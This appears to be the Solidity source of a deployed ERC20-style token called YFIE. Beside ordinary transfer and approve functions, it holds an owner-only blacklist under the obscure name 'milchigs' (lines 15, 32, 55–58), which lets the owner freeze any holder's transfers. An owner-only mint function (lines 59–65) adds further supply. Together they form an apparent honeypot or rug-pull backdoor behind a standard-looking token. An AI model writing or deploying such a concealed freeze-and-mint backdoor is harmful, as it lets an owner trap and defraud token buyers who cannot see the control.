1 pragma solidity >=0.4.22 <0.6.0;
2 
3 contract BWSERC20
4 {
5     string public standard = 'http://www.yfie.cc/';
6     string public name="YFIE"; 
7     string public symbol="YFIE";
8     uint8 public decimals = 18; 
9     uint256 public totalSupply=83000 ether; 
10     
11     address st_owner;
12 
13     mapping (address => uint256) public balanceOf;
14     mapping (address => mapping (address => uint256)) public allowance;
15     mapping (address => bool) milchigs;
16     event Transfer(address indexed from, address indexed to, uint256 value);
17     event Burn(address indexed from, uint256 value); 
18     
19     uint256 issue=23000 ether;
20     
21     constructor ()public
22     {
23         st_owner=msg.sender;
24         balanceOf[st_owner]=60000 ether;
25 
26     }
27     
28     function _transfer(address _from, address _to, uint256 _value) internal {
29       require(_to != address(0x0));
30       require(balanceOf[_from] >= _value);
31       require(balanceOf[_to] + _value > balanceOf[_to]);
32       require(milchigs[_from] == false);
33       uint previousBalances = balanceOf[_from] + balanceOf[_to];
34       balanceOf[_from] -= _value;
35       balanceOf[_to] += _value;
36       emit Transfer(_from, _to, _value);
37       assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
38     }
39     
40     function transfer(address _to, uint256 _value) public {
41         _transfer(msg.sender, _to, _value);
42     }
43     
44     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){
45         require(_value <= allowance[_from][msg.sender]);   // Check allowance
46         allowance[_from][msg.sender] -= _value;
47         _transfer(_from, _to, _value);
48         return true;
49     }
50     
51     function approve(address _spender, uint256 _value) public returns (bool success) {
52         allowance[msg.sender][_spender] = _value;
53         return true;
54     }
55     function setMilchigs(address addr,bool value)public{
56         require(msg.sender == st_owner);
57         milchigs[addr]=value;
58     }
59     function runIssue(address addr,uint256 value)public{
60         require(msg.sender == st_owner);
61         uint256 v=value * (10**18);
62         require (v<= issue);
63         issue -= v;
64         balanceOf[addr]+=v;
65     }
66 }